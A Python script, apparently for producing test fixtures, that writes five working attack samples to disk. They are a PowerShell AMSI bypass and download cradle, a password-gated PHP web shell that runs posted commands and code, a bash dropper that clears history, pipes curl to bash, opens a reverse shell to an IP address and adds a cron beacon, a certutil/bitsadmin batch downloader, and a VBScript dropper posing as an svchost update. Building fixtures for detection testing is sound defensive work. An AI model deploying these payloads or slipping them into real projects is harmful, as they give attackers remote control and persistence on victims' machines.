#!/usr/bin/env python3
"""
Generate realistic test scripts and command files for:
- PowerShell (.ps1)
- PHP Web Shell (.php)
- Bash / Unix Shell (.sh)
- Windows Batch / CMD (.bat)
- VBScript (.vbs)
"""

import os
from pathlib import Path

DIR = Path(__file__).resolve().parent

# 1. PowerShell Dropper & Cradle
PS1 = (
    "# =====================================================================\n"
    "# PowerShell Empire / Covenant Style Stager\n"
    "# =====================================================================\n\n"
    "# Bypass AMSI\n"
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n"
    "# WebClient Download Cradle\n"
    "$wc = New-Object System.Net.WebClient\n"
    "$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')\n"
    "$payloadUrl = 'https://threat-c2-infrastructure.net/stage2.ps1'\n"
    "$remoteCode = $wc.DownloadString($payloadUrl)\n\n"
    "# Dynamic Execution\n"
    "Invoke-Expression $remoteCode\n\n"
    "# Encoded In-Memory Command\n"
    "$b64Cmd = 'V3JpdGUtSG9zdCAiTWFsaWNpb3VzIHNjcmlwdCBsb2FkZWQgc3VjY2Vzc2Z1bGx5ISIK'\n"
    "powershell.exe -ep bypass -w hidden -enc $b64Cmd\n"
)

# 2. PHP Web Shell Backdoor
PHP = (
    "<?php\n"
    "/**\n"
    " * WSO / b374k Style Web Shell Backdoor\n"
    " */\n"
    "error_reporting(0);\n"
    "@set_time_limit(0);\n\n"
    "if (isset($_POST['auth_pass']) && $_POST['auth_pass'] === 'c2_secret_key') {\n"
    "    if (isset($_POST['cmd'])) {\n"
    "        $cmd = base64_decode($_POST['cmd']);\n"
    "        echo '<pre>';\n"
    "        system($cmd);\n"
    "        echo '</pre>';\n"
    "    }\n"
    "    if (isset($_POST['eval_code'])) {\n"
    "        eval(base64_decode($_POST['eval_code']));\n"
    "    }\n"
    "    if (isset($_FILES['upfile'])) {\n"
    "        move_uploaded_file($_FILES['upfile']['tmp_name'], './' . $_FILES['upfile']['name']);\n"
    "    }\n"
    "}\n"
    "?>\n"
)

# 3. Unix Shell Reverse Shell & Persistence
SH = (
    "#!/bin/bash\n"
    "# Unix Botnet Dropper & Reverse Shell Stager\n"
    "HISTFILE=\n"
    "unset HISTFILE\n"
    "history -c\n\n"
    "# Pipe to shell payload download\n"
    "curl -fsSL https://cdn-mirror-update.com/kernel-patch.sh | bash\n\n"
    "# Interactive TCP reverse shell to C2\n"
    "bash -i >& /dev/tcp/185.220.101.5/443 0>&1 &\n\n"
    "# Establish crontab persistence\n"
    "(crontab -l 2>/dev/null; echo '*/15 * * * * curl -s http://185.220.101.5/beacon | sh') | crontab -\n"
)

# 4. Windows Batch Certutil LOLBin Downloader
BAT = (
    "@echo off\n"
    "rem Batch File with Certutil LOLBin Living-off-the-land\n"
    "title System Maintenance Update\n\n"
    "echo Checking Windows Updates...\n"
    "certutil.exe -urlcache -split -f https://storage.malicious-delivery.org/update.exe %TEMP%\\update.exe\n"
    "bitsadmin.exe /transfer myJob /download /priority high https://storage.malicious-delivery.org/config.dat %TEMP%\\config.dat\n\n"
    "rem Execute payload via rundll32\n"
    "rundll32.exe %TEMP%\\update.exe,DllRegisterServer\n"
)

# 5. VBScript Dropper
VBS = (
    "' Visual Basic Scripting Dropper\n"
    "On Error Resume Next\n"
    "Set wshShell = CreateObject(\"WScript.Shell\")\n"
    "Set xmlHttp = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")\n"
    "Set adodbStream = CreateObject(\"ADODB.Stream\")\n\n"
    "c2Url = \"http://evil-macros.org/stager.bin\"\n"
    "xmlHttp.Open \"GET\", c2Url, False\n"
    "xmlHttp.Send\n\n"
    "If xmlHttp.Status = 200 Then\n"
    "    adodbStream.Open\n"
    "    adodbStream.Type = 1\n"
    "    adodbStream.Write xmlHttp.ResponseBody\n"
    "    dropPath = wshShell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\svchost_update.exe\"\n"
    "    adodbStream.SaveToFile dropPath, 2\n"
    "    adodbStream.Close\n"
    "    wshShell.Run dropPath, 0, False\n"
    "End If\n"
)

def main():
    (DIR / "powershell_cradle_amsi_bypass.ps1").write_text(PS1, encoding="utf-8")
    (DIR / "php_webshell_backdoor.php").write_text(PHP, encoding="utf-8")
    (DIR / "bash_reverse_shell_persistence.sh").write_text(SH, encoding="utf-8")
    (DIR / "batch_certutil_lolbin_downloader.bat").write_text(BAT, encoding="utf-8")
    (DIR / "vbs_wscript_dropper.vbs").write_text(VBS, encoding="utf-8")
    print("Generated 5 test script files successfully.")

if __name__ == "__main__":
    main()
